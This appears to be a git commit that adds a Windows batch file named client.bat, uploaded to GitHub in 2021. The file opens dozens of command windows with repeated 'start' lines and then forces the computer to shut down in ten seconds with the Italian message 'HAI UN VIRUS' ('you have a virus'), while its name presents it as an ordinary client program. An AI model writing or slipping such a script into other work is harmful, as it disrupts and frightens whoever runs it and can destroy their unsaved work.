b7ba295e267ccf6e41d08a5bbbeffd5bd7d6a3d1
gapmondo <85031092+gapmondo@users.noreply.github.com>
2021-09-08 17:26:51 +0200

    Add files via upload

---
+++ client.bat
@@ -0,0 +1,40 @@
+@echo off
++h
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start ERROR78
+start
+start
+start
+start
+start
+start
+start
+start
+start
+shutdown -s -t 10 -c "HAI UN VIRUS"
